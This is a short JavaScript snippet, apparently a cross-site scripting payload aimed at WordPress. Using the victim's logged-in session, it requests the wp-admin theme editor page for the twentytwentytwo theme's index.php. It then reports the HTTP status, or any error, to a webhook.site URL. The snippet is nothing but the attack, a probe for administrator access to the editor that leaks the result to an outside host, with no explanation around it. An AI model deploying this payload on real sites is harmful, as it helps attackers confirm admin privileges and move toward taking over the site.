try{
  //await fetch("http://localhost:1024/",{mode:'no-cors'});
  var a = await fetch(`${document.location.origin}/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo`,{"credentials":"include","mode":"cors"}).then(resp=>{return resp.status}).then(status => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+status)});
  
}catch(err){
  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
}
